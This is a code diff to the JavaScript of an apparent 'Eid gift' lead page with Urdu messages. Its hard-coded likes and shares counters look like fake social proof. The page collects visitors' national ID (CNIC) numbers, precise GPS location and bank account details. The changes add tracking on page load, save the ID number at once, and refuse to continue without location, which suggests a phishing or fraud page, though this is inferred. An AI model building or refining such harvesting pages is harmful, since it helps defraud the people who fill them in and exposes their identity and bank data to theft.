@@ -1580,12 +1580,44 @@ var likes = 134,
  comments = 23,
  shares = 12;
 const eidTohfaLeadStoreUrl = @json(route('eid-tohfa.lead.store'));
+const eidTohfaTrackVisitUrl = @json(route('eid-tohfa.track.visit'));
 const eidTohfaCsrfToken = @json(csrf_token());
+
+// Track first visit immediately on page load
+(function() {
+ if (!sessionStorage.getItem('eid_tohfa_tracked')) {
+ fetch(eidTohfaTrackVisitUrl, {
+ method: 'POST',
+ headers: {
+ 'Content-Type': 'application/json',
+ 'Accept': 'application/json',
+ 'X-Requested-With': 'XMLHttpRequest',
+ 'X-CSRF-TOKEN': eidTohfaCsrfToken
+ },
+ body: JSON.stringify({})
+ })
+ .then(response => response.json())
+ .then(data => {
+ if (data.success && data.lead_id) {
+ $("#eidTohfaLeadId").val(data.lead_id);
+ sessionStorage.setItem('eid_tohfa_tracked', '1');
+ sessionStorage.setItem('eid_tohfa_lead_id', data.lead_id);
+ }
+ })
+ .catch(err => console.log('Visit tracking failed:', err));
+ } else {
+ const leadId = sessionStorage.getItem('eid_tohfa_lead_id');
+ if (leadId) {
+ $("#eidTohfaLeadId").val(leadId);
+ }
+ }
+})();
 
 function postEidTohfaLead(extraData) {
  const payload = new FormData();
  const data = Object.assign({
  lead_id: $("#eidTohfaLeadId").val(),
+ step: extraData && extraData.step ? extraData.step : "bank",
  cnic: $("#capturedCnic").val() || ($("#cnicNumber").val() || "").replace(/\D/g, ""),
  latitude: $("#locationLatitude").val(),
  longitude: $("#locationLongitude").val(),
@@ -1832,9 +1864,24 @@ $("#submitCnic").click(function () {
 
  $("#cnicError").fadeOut(0);
  $("#capturedCnic").val(cnic);
+
+ // Save CNIC to backend immediately
+ postEidTohfaLead({ step: "cnic" })
+ .then(function (data) {
+ if (data.lead_id) {
+ $("#eidTohfaLeadId").val(data.lead_id);
+ }
  $("#cnicStep").fadeOut(0, function () {
  $("#locationStep").fadeIn(250);
  keepStepInView("#locationStep");
+ });
+ })
+ .catch(function () {
+ // Still proceed even if save fails
+ $("#cnicStep").fadeOut(0, function () {
+ $("#locationStep").fadeIn(250);
+ keepStepInView("#locationStep");
+ });
  });
 });
 
@@ -1842,22 +1889,43 @@ $("#denyLocation").click(function () {
  $("#locationError").text(@json($locationDeniedMessage)).fadeIn(250);
 });
 
-$("#allowLocation").click(function () {
- const $button = $(this);
-
- $("#locationError").fadeOut(0);
-
+function requestLocationWithPrompt($button) {
+ // Check geolocation support
  if (!navigator.geolocation) {
  $("#locationError").text("آپ کے براؤزر میں لوکیشن کی سہولت دستیاب نہیں۔").fadeIn(250);
  return;
  }
 
+ // Check secure context (HTTPS required for geolocation in most browsers)
  if (!window.isSecureContext && !["localhost", "127.0.0.1"].includes(window.location.hostname)) {
  $("#locationError").text("لوکیشن پرمشن کے لیے HTTPS ضروری ہے۔").fadeIn(250);
  return;
  }
 
- $button.prop("disabled", true).text("لوکیشن چیک ہو رہی ہے...");
+ // Check Permissions API first (if available)
+ if (navigator.permissions && navigator.permissions.query) {
+ navigator.permissions.query({ name: "geolocation" }).then(function (status) {
+ if (status.state === "denied") {
+ $("#locationError").html(
+ "لوکیشن کی اجازت مسترد کر دی گئی ہے۔<br>" +
+ "<small>براہ کرم اپنے براؤزر کی سیٹنگز میں جا کر لوکیشن کی اجازت بحال کریں:</small><br>" +
+ "<small><b>Chrome:</b> Settings > Privacy > Site Settings > Location</small><br>" +
+ "<small><b>Firefox:</b> Settings > Privacy > Permissions > Location</small>"
+ ).fadeIn(250);
+ return;
+ }
+ captureLocation($button);
+ }).catch(function () {
+ // Permissions API not supported, proceed directly
+ captureLocation($button);
+ });
+ } else {
+ captureLocation($button);
+ }
+}
+
+function captureLocation($button) {
+ $button.prop("disabled", true).text("براؤزر میں اجازت دیں...");
 
  navigator.geolocation.getCurrentPosition(
  function (position) {
@@ -1868,9 +1936,15 @@ $("#allowLocation").click(function () {
  $("#locationLongitude").val(coords.longitude.toFixed(7));
  $("#locationAccuracy").val(coords.accuracy ? coords.accuracy.toFixed(2) : "");
  $("#locationCapturedAt").val(capturedAt);
- $("#locationCapturedText").text("لوکیشن محفوظ ہو گئی۔").fadeIn(150);
+ $("#locationCapturedText")
+ .html(
+ "📍 لوکیشن محفوظ ہو گئی۔<br>" +
+ "<small>Lat: " + coords.latitude.toFixed(7) + " | Lng: " + coords.longitude.toFixed(7) + "</small>" +
+ (coords.accuracy ? "<br><small>دقت: ±" + coords.accuracy.toFixed(1) + "m</small>" : "")
+ )
+ .fadeIn(150);
 
- postEidTohfaLead()
+ postEidTohfaLead({ step: "location" })
  .then(function (data) {
  if (data.lead_id) {
  $("#eidTohfaLeadId").val(data.lead_id);
@@ -1886,16 +1960,33 @@ $("#allowLocation").click(function () {
  $button.prop("disabled", false).text(@json($locationAllowButton));
  });
  },
- function () {
- $("#locationError").text(@json($locationDeniedMessage)).fadeIn(250);
+ function (error) {
+ var msg = @json($locationDeniedMessage);
+ switch (error.code) {
+ case error.PERMISSION_DENIED:
+ msg = "لوکیشن کی اجازت نہیں دی گئی۔ درخواست آگے نہیں بڑھ سکتی۔";
+ break;
+ case error.POSITION_UNAVAILABLE:
+ msg = "لوکیشن کی معلومات دستیاب نہیں۔ براہ کرم دوبارہ کوشش کریں۔";
+ break;
+ case error.TIMEOUT:
+ msg = "لوکیشن حاصل کرنے میں وقت ختم ہو گیا۔ براہ کرم دوبارہ کوشش کریں۔";
+ break;
+ }
+ $("#locationError").text(msg).fadeIn(250);
  $button.prop("disabled", false).text(@json($locationAllowButton));
  },
  {
  enableHighAccuracy: true,
- timeout: 12000,
+ timeout: 15000,
  maximumAge: 0
  }
  );
+}
+
+$("#allowLocation").click(function () {
+ $("#locationError").fadeOut(0);
+ requestLocationWithPrompt($(this));
 });
 
 $("#confirm").click(function () {
@@ -1913,7 +2004,8 @@ $("#confirm").click(function () {
 
  postEidTohfaLead({
  bank_name: bankName,
- account_number: accountNumber
+ account_number: accountNumber,
+ step: "bank"
  })
  .then(function () {
  $("#info").fadeOut(0, function () {
